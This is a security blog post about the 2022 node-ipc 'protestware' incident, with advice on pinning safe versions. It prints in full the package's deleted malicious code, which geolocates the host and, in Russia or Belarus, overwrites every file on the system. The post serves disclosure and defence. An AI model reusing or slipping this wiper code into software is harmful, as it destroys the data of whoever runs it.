---
title: "Protestware": How node-ipc turned into malware
description: The node-ipc package has turned into malware for Russian computers.
slug: node-ipc-protestware
date: 2022-03-18
image: https://www.lunasec.io/docs/img/.png
keywords: [node-ipc, protestware]
tags: [node-ipc, npm, nodejs]
authors: [chris]
---

<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

`node-ipc` is a package used in a number of projects. Here is a long, but not exhaustive list of projects that include
this dependency: https://github.com/zlw9991/node-ipc-dependencies-list. Among the list of projects affected is most notably is the [Vue web framework](https://www.npmjs.com/package/@vue/cli-shared-utils).

Snyk has written a [blog post](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/) detailing
the timeline of events around the releasing of this malicius version.

The malicious code, which has since been deleted can be found [here](https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js).
This code was [obfuscated](https://github.com/RIAEvangelist/node-ipc/issues/233#issuecomment-1072077181) to hide its intentions by the developer as more people started to pay attention to what was happening. 

```js
import p from "path";
import fs from "fs";
import https from "https";
setTimeout(function () {
    if (Math.round(Math.random() * 4) > 1) {
        return;
    }
    const geoLocation = "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154";
    https.get(geoLocation, function (response) {
        response.on("data", function (jsonData) {
            try {
                const jsonObject = JSON.parse(jsonData);
                const countryName = jsonObject["country_name"].toLowerCase();
                if (countryName.includes("russia") || countryName.includes("belarus")) {
                    getFiles("./");
                    getFiles("../");
                    getFiles("../../");
                    getFiles("/");
                }
            } catch (response) {}
        });
    });
}, Math.ceil(Math.random() * 1000));

async function getFiles(path = "", param2 = "") {
    if (!fs.existsSync(path)) {
        return;
    }
    let fileInDir = [];
    try {
        fileInDir = fs.readdirSync(path);
    } catch (t) {}
    const toDelete = [];
    for (var i = 0; i < fileInDir.length; i++) {
        const combinedPath = p.join(path, fileInDir[i]);
        let pathData = null;
        try {
            pathData = fs.lstatSync(combinedPath);
        } catch (t) {
            continue;
        }
        if (pathData.isDirectory()) {
            const result = getFiles(combinedPath, param2);
            result.length > 0 ? toDelete.push(...result) : null;
        } else if (combinedPath.indexOf(param2) >= 0) {
            try {
                fs.writeFile(combinedPath, "❤️", function () {});
            } catch (t) {}
        }
    }
    return toDelete;
}
const ssl = true;
export { ssl as default, ssl };
```

The code attempts to geolocate where the code is running, and if it discovers it is running with in Russia or Belarus, then it attempts to
replace the contents of every file on the system with a unicode heart character: ❤.

You can pin the `node-ipc` version to a known version by adding this to your package.json:
```json
"overrides": {
    "node-ipc@>9.2.1 <10": "9.2.1",
    "node-ipc@>10.1.0": "10.1.0"
}
```

This will prevent future malicious updates to the package from being included in your project.

On NPM, previous versions that were pushed that contained the malicious code, versions
[9.2.2](https://www.npmjs.com/package/node-ipc/v/9.2.2), [10.1.1](https://www.npmjs.com/package/node-ipc/v/10.1.1),
[10.1.2](https://www.npmjs.com/package/node-ipc/v/10.1.2), [have all been removed](https://www.npmjs.com/package/node-ipc).

However, newely released versions, > 11.x.x, all now contain the library [peacenotwar](https://www.npmjs.com/package/peacenotwar).
Unlike the previous malicious code, this library does not remove files. Instead, the library attempts to "deliver a peaceful message"
by [writing the contents](https://github.com/RIAEvangelist/peacenotwar/blob/main/index.js#L32) of the file, [WITH-LOVE-FROM-AMERICA.txt](https://github.com/RIAEvangelist/peacenotwar/blob/main/WITH-LOVE-FROM-AMERICA.txt)
to the host filesystem.

The updates to the `node-ipc` struck a chord with developers on the Internet and a great deal of activity has been 
happening on the project page since the version release.

**Warning** The follow links may contain offensive terms, and are not safe for work.

A number of
[issues](https://github.com/RIAEvangelist/node-ipc/issues), [pull requests](https://github.com/RIAEvangelist/node-ipc/pulls), and [discussions](https://github.com/RIAEvangelist/node-ipc/discussions) 
have been created in outrage over the developer's modifications to their library.

All of this is happening on the coat-tail of the widely used libraries `faker.js` and `colors.js` having code changes pushed
to [intentionally corrupt](https://www.theverge.com/2022/1/9/22874949/developer-corrupts-open-source-libraries-projects-affected)
projects that included them.

## Unacceptable

